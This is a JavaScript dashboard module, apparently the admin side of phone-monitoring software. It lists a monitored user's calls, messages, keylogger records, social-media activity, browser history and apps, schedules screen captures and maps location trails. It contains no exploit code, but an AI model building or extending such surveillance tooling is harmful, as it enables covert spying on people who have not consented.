var userDatatables = null;
var contactDatatables = null;
var callDatatables = null;
var messageDatatables = null;
var notificationDatatables = null;
var keyLoggerDatatables = null;
var socialMediaDatatables = null;
var browserHistoryDatatables = null;
var applicationListDatatables = null;
var screenVideoTimeingDatatables = null;
var screenPhotoTimeingDatatables = null;

var User = function () {

    var handleUserDatatable = function () {
        userDatatables = getDataTable('#user_table', affiliateurl + 'user/manageUser/', {
            dataTable: {}
        });
    }
    
    var handleOverview = function () {

    }

    var handleApplication = function () {
        applicationListDatatables = getDataTable('#application_table', affiliateurl + 'user/manageApplication/' + userId, {
            dataTable: {}
        });
    }

    var handleContactDatatable = function () {
        contactDatatables = getDataTable('#contact_table', affiliateurl + 'user/manageContact/' + userId, {
            dataTable: {}
        });
    }

    var handleCallLogDatatable = function (table, value) {
        var url = '';
        if ((typeof table === 'undefined') && (typeof value === 'undefined')) {
            table = '#call_table';
            if(type == ''){
                url = affiliateurl + 'user/manageCall/' + userId;
            }else{
                url = affiliateurl + 'user/manageCall/' + userId + '/' + type;
            }
            
        } else {
            table = '#' + table;
            url = affiliateurl + 'user/manageCall/' + userId + '/' + value;
        }
        callDatatables = getDataTable(table, url, {
            dataTable: {
                "order": [
                    [4, "desc"]
                ]
            }
        });
    }

    var handleMessageDatatable = function (table, value) {
        var url = '';
        if ((typeof table === 'undefined') && (typeof value === 'undefined')) {
            table = '#message_table';
            if(type == ''){
                url = affiliateurl + 'user/manageMessage/' + userId;
            }else{
                url = affiliateurl + 'user/manageMessage/' + userId + '/' + type;
            }
            
        } else {
            table = '#' + table;
            url = affiliateurl + 'user/manageMessage/' + userId + '/' + value;
        }
        messageDatatables = getDataTable(table, url, {
            dataTable: {
                "order": [
                    [4, "desc"]
                ]
            }
        });
    }

    var handleNotificationDatatable = function () {
        notificationDatatables = getDataTable('#notification_table', affiliateurl + 'user/manageNotification/' + userId, {
            dataTable: {}
        });
    }

    var handleKeyLoggerDatatable = function () {
        keyLoggerDatatables = getDataTable('#key_logger_table', affiliateurl + 'user/manageKeyLogger/' + userId, {
            dataTable: {
                "order": [
                    [3, "desc"]
                ]
            }
        });
    }

    var handleSocialMediaDatatable = function (table, value) {

        var url = '';
        if ((typeof table === 'undefined') && (typeof value === 'undefined')) {
            table = '#social_media_table';
            if(type == ''){
                url = affiliateurl + 'user/manageSocialMedia/' + userId;
            }else{
                url = affiliateurl + 'user/manageSocialMedia/' + userId + '/' + type;
            }
            
        } else {
            table = '#' + table;
            url = affiliateurl + 'user/manageSocialMedia/' + userId + '/' + value;
        }

        socialMediaDatatables = getDataTable(table, url, {
            dataTable: {
                "order": [
                    [4, "desc"]
                ]
            }
        });
    }

    var handleBrowserHistoryDatatable = function () {
        browserHistoryDatatables = getDataTable('#browser_history_table', affiliateurl + 'user/manageBrowserHistory/' + userId, {
            dataTable: {
                "order": [
                    [3, "desc"]
                ]
            }
        });
    }

    var handleScreenPicDatatatable = function () {
        screenPhotoTimeingDatatables = getDataTable('#screen_pic_time', affiliateurl + 'user/manageScreenPicTime/' + userId, {
            dataTable: {}
        });
    }

    var handleScreenVideoDatatatable = function () {
        screenVideoTimeingDatatables = getDataTable('#screen_video_time', affiliateurl + 'user/manageVideoTime/' + userId, {
            dataTable: {}
        });
    }

    var handleStatus = function () {
        $('body').on('click', '.ceckBoxStatus', function () {

            var value = $(this).val();
            var status = '';
            if ($(this).is(':checked')) {
                var status = '1';
            } else {
                var status = '0';
            }

            var data = {id: value, status: status, user_id: userId};
            var url = affiliateurl + 'user/handleStatus';

            ajaxcall(url, data, function (output) {
                if ($.trim(output) == 'success') {
                    $('#application_table').DataTable().ajax.reload();
                }
            });
        });
    }

    var handleFiltering = function (table) {
        $('.slectOption').on('change', function () {
            var value = $(this).val();
            $('#' + table).DataTable().destroy();
            if (table == 'message_table') {
                handleMessageDatatable(table, value);
            } else if (table == 'call_table') {
                handleCallLogDatatable(table, value);
            } else if (table == 'social_media_table') {
                handleSocialMediaDatatable(table, value);
            }
        })
    }

    var isPreviousEventComplete = true;
    var offset = 2;

    var handleGallaryData = function () {
        $(window).scroll(function () {
            bindScroll('G', 'pic');
        });
    }

    var handleScreenPicData = function () {
        $(window).scroll(function () {
            bindScroll('SP', 'pic');
        });
    }

    var handleVideoData = function () {
        $(window).scroll(function () {
            bindScroll('V', 'video');
        });
    }

    var handleVideoScreenData = function () {
        $(window).scroll(function () {
            bindScroll('VS', 'video');
        });
    }

    var handelScreenPicTimeing = function () {
        var form = $('#screenPicId');
        var rules = {

            start_date_time: {required: true},
            end_date_time: {required: true},
            time_interval: {required: true},

        };
        var messages = {

            start_date_time: {required: "Please enter start date"},
            end_date_time: {required: "Please enter end date"},
            time_interval: {required: "Please select time interval"},

        };

        handleFormValidate(form, rules, messages, function () {
            handleAjaxFormSubmit(form);
        });
    }

    var handelScreenVideoTimeing = function () {
        var form = $('#screenVideoId');
        var rules = {

            start_date_time: {required: true},
            end_date_time: {required: true},

        };
        var messages = {

            start_date_time: {required: "Please enter start date"},
            end_date_time: {required: "Please enter end date"},

        };

        handleFormValidate(form, rules, messages, function () {
            handleAjaxFormSubmit(form);
        });
    }

    var handleTimeingStatus = function () {
        $('body').on('click', '.handle_status', function () {
            var table = $(this).attr('data-table');
            var url = $(this).attr('data-href');
            var data = {id: $(this).attr('data-id'), status: $(this).attr('data-status') , user_id : userId};

            ajaxcall(url, data, function (output) {
                if (output == 'success') {
                    $('#' + table).DataTable().destroy();
                    if (table == 'screen_video_time') {
                        handleScreenVideoDatatatable();
                    } else if (table == 'screen_pic_time') {
                        handleScreenPicDatatatable();
                    }
                }
            })
        });
    }
    
    /*Render Maps*/
    
    var handleGeoLocation = function (){
//        console.log(globleData); return false;
        if ($('#mapGeoRender').length > 0) {

            var locations = jQuery.parseJSON(globleData);

            window.map = new google.maps.Map(document.getElementById('mapGeoRender'), {
                mapTypeId: google.maps.MapTypeId.ROADMAP,
                scrollwheel: false,
                clickableIcons: false,
            });

            var infowindow = new google.maps.InfoWindow();
            var flightPlanCoordinates = [];
            var bounds = new google.maps.LatLngBounds();

            var markerPosition = '';
            var contentSet = '';
            var j =0;
            for (var i = 0; i < locations.length; i++) {
                j++;
                markerPosition = new google.maps.LatLng(locations[i].latitude, locations[i].longitude);
                contentSet = '';
                console.log('https://raw.githubusercontent.com/Concept211/Google-Maps-Markers/master/images/marker_red'+j+'.png');
                marker = new google.maps.Marker({
                    position: markerPosition,
                    content: contentSet,
                    map: map,
                    icon : 'https://raw.githubusercontent.com/Concept211/Google-Maps-Markers/master/images/marker_red'+j+'.png',
                });

                flightPlanCoordinates.push(marker.getPosition());
                bounds.extend(marker.position);

                google.maps.event.addListener(marker, 'click', (function (marker, i) {

                    return function () {
                        if (this.content != '') {
                            infowindow.setContent(this.content);
                            infowindow.open(map, marker);
                        }
                    }
                })(marker, i));
            }
            /*Code For Infowindow Design*/

            map.fitBounds(bounds);

            var flightPath = new google.maps.Polyline({
                map: map,
                path: flightPlanCoordinates,
                strokeColor: "#FF0000",
                strokeOpacity: 1.0,
                strokeWeight: 2,
            });
        }
    }

    function bindScroll(type, pageType) {
        if ($(document).height() - 350 <= $(window).scrollTop() + $(window).height()) {
            $(window).unbind('scroll');
            loadMore(type, pageType);
        }
    }

    function loadMore(type, pageType) {
        if (isPreviousEventComplete) {
            var lastId = $('#appendData').attr('last-id');
            if (typeof lastId !== 'undefined' && lastId != '') {
                isPreviousEventComplete = false;
                offset = offset;

                $.ajax({
                    type: 'post',
                    url: affiliateurl + 'user/handlePagination',
                    data: {
                        id: userId,
                        lastId: lastId,
                        type: type,
                        pagination_type: pageType,
                        offset: offset,
                    },
                    success: function (res) {
                        isPreviousEventComplete = true;
                        offset = offset + 1;
                        var output = JSON.parse(res);
                        if (output.lastId != '' && output.main != '') {
                            $('#appendData').attr('last-id', output.lastId);
                            $('#appendData').append(output.main);
                            baguetteBox.run('.tz-gallery');
                        } else {
                            $('#appendData').attr('last-id', '')
                        }
                    }
                });
            }
        }
        $(window).bind('scroll', function () {
            bindScroll(type, pageType);
        });
    }
    
    var handleUserOperations = function () {
        var form = $('#userAdd');
        var rules = {
            name: {
                required: true,
            },
            email: {
                required: true,
                email : true,
            },
            phone: {
                required: true,
                number : true,
            },
        };
        var messages = {
            name: {
                required: "Please enter name",
            },
            email: {
                required: "Please enter email",
                email : "Please enter valid email",
            },
            phone: {
                required: "Please enter phone number",
                number : "Please enter only number",
            },
        };
        
        handleFormValidate(form, rules, messages, function () {
            handleAjaxFormSubmit(form);
        });
    }
    
    var handleUserStatus = function (){
        $('body').on('click', '.updateStatus', function () {
            var id = $(this).attr('data-id');
            var status = $(this).attr('data-status');
            var url = affiliateurl + 'user/handleMonitoringStatus';
            var data = {id: id, status: status};

            ajaxcall(url, data, function (output) {
                handleAjaxResponse(output);
                $('#user_table').DataTable().ajax.reload(null, false).on('draw.dt', function () {});
                return false;
            });
        });
        
        $('body').on('click', '.updateAppStatus', function () {
            var id = $(this).attr('data-id');
            var status = $(this).attr('data-status');
            var url = affiliateurl + 'user/handleAppStatus';
            var data = {id: id, status: status};

            ajaxcall(url, data, function (output) {
                handleAjaxResponse(output);
                $('#user_table').DataTable().ajax.reload(null, false).on('draw.dt', function () {});
                return false;
            });
        });
    }
    
    return {
        init: function () {
            handleUserDatatable();
            handleUserStatus();
        },
        overview: function () {
            handleOverview();
        },
        contact: function () {
            handleContactDatatable();
        },
        call: function () {
            handleCallLogDatatable();
            handleFiltering('call_table');
        },
        message: function () {
            handleMessageDatatable();
            handleFiltering('message_table');
        },
        notification: function () {
            handleNotificationDatatable();
        },
        key_looger: function () {
            handleKeyLoggerDatatable();
        },
        social_media: function () {
            handleSocialMediaDatatable();
            handleFiltering('social_media_table');
        },
        browser_history: function () {
            handleBrowserHistoryDatatable();
        },
        application: function () {
            handleApplication();
            handleStatus();
        },
        gallary: function () {
            handleGallaryData();
        },
        screen_pic: function () {
            handleScreenPicData();
        },
        video: function () {
            handleVideoData();
        },
        video_screen: function () {
            handleVideoScreenData();
        },
        screen_pic_time: function () {
            handleScreenPicDatatatable();
            handelScreenPicTimeing();
            handleTimeingStatus();
            if (jQuery().datepicker) {
                $(".form_datetime").datetimepicker({
                    autoclose: true,
                });
            }
        },
        screen_video_time: function () {
            handleScreenVideoDatatatable();
            handelScreenVideoTimeing();
            handleTimeingStatus();
            if (jQuery().datepicker) {
                $(".form_datetime").datetimepicker({
                    autoclose: true,
                });
            }
        },
        geo_location: function (){
            handleGeoLocation();
        },
        user_init : function(){
            handleUserOperations();
            
        }
        
    }
}();